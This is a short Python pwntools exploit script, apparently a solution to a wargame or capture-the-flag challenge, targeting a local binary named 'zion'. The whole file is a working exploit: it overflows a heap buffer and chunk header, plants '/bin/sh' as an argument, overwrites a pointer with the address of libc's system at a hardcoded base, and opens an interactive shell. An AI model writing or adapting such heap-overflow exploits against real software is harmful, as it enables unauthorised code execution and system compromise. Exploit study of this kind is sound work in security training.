import sys
from pwn import *

context.arch = 'amd64'
io = process("/home/bonus01/zion")

io.send(b"some buffer data")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000

arg = b"/bin/sh\0"

payload = b""
payload += (16 + 64) * b"A" # buff and header of the chunck
payload += arg + b"B"*(24 - len(arg)) # block data (id + size + label)
payload += p64(libc.sym["system"])

io.send(payload)

io.interactive()